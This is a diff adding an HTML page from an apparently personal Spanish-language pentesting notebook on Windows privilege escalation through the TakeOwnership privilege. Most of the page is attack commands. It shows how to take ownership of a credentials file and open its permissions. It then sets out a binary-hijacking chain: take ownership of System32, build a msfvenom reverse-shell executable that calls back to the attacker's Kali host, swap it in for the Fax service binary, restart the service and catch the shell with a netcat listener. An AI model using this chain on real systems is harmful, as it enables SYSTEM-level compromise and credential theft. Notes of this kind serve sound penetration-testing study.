@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>TakeOwnership | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="takeownership">
+          <div class="note-tabbar">
+            <span>TakeOwnership</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>TakeOwnership</h2>
+
+            <h2>Permite modificar permisos de directorios</h2>
+
+            <p>En caso de recibir <code>access denied</code> podemos modificar los permisos para leer o escribir directorios y archivos</p>
+
+            <section class="code-card">
+              <h3>PowerShell: Modificar propietario y permisos</h3>
+              <pre><code>takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant Everyone:F
+type 'C:\Department Shares\Private\IT\cred.txt'</code></pre>
+            </section>
+
+            <h2>Binary Hijacking</h2>
+
+            <section class="code-card">
+              <h3>CMD: Buscar Servicios Privilegiados -&gt; SERVICE_START_NAME: LocalSystem</h3>
+              <pre><code># Listar servicios
+wmic service list brief # CMD
+services # PowerShell
+
+# Escoger Servicios SERVICE_START_NAME: LocalSystem (SYSTEM ) y StartMode: Manual
+# Ej. service_name = Fax
+sc.exe qc Fax
+Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq Fax} | Select-Object *
+
+# Tiene el PathName C:\Windows\system32\fxssvc.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Convertirnos en propietario y cambiar permisos para poder escribir y leer en el directorio</h3>
+              <pre><code>takeown /f 'C:\Windows\System32' # Convertirnos en propietarios
+icacls 'C:\Windows\System32' /grant user:F  # Dar permisos completos
+# F: Todos los permisos
+cacls 'C:\Windows\System32' /grant user:F  # Ver Permisos</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Payload</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; rev.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Reemplazar binario por payload</h3>
+              <pre><code>mv C:\Windows\system32\fxssvc.exe C:\Windows\system32\fxssvc.exe.back
+copy rev.exe C:\Windows\system32\fxssvc.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+              <pre><code>sc.exe stop &lt;service_name&gt;
+net stop &lt;service_name&gt; # Alternativa
+sc.exe start &lt;service_name&gt;
+net start &lt;service_name&gt; # Alternativa</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Listener</h3>
+              <pre><code>rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>takeownership</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
